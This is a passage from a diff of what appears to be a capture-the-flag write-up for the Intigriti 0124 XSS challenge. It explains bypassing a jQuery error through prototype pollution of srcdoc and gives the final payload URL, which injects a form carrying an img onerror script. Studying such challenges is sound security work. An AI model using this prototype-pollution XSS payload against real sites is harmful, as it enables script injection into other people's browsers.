@@ -17,5 +17,5 @@ jquery-3.7.1.min.js:2 Uncaught (in promise) TypeError: Cannot use 'in' operator 
 + by using __proto__[srcdoc][], I can make srcdoc into an array, and bypass the error, then execute the e.setAttribute function. Here’s the final payload:
 `https://challenge-0124.intigriti.io/challenge?search=con&name=<form id=search><input name="__proto__[srcdoc][]" value="<img/src/onerror=alert(document.domain)>"><input name="__proto__[homepage]" value="https://google.com"><input name="__proto__[owner]" value="test">`
 + ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/350819e0-e47c-4275-b07e-22c930831492)
-
+refer: https://medium.com/@rodriguezjorgex/how-i-passed-the-intigriti-0124-challenge-b6c2d1cd1b7b
 
